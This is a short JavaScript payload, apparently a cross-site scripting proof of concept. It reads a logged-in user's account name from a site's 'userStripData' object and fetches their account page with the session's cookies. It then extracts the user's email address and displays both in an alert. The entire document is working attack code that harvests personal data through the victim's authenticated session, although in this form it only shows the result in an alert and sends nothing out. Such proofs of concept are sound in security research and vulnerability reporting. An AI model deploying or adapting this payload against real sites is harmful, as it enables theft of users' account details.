(async () => {
  try {
    const name = userStripData?.clientData?.account_menu?.account_menu_name;
    const url = userStripData?.clientData?.account_menu?.account_menu_links?.[1]?.url;

    if (!name || !url) {
      alert("XSS Worked, but are you logged in?");
      return;
    }

    const response = await fetch(url, { credentials: "include" });
    const html = await response.text();

    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    const spans = doc.querySelectorAll("span.FL_Label");
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    let email = "Email not found";

    for (const span of spans) {
      const text = span.textContent.trim();
      if (emailRegex.test(text)) {
        email = text.match(emailRegex)[0];
        break;
      }
    }

    alert(`User: ${name}, Email: ${email}`);
  } catch (err) {
    console.error("Error:", err);
    alert("Something went wrong!");
  }
})();
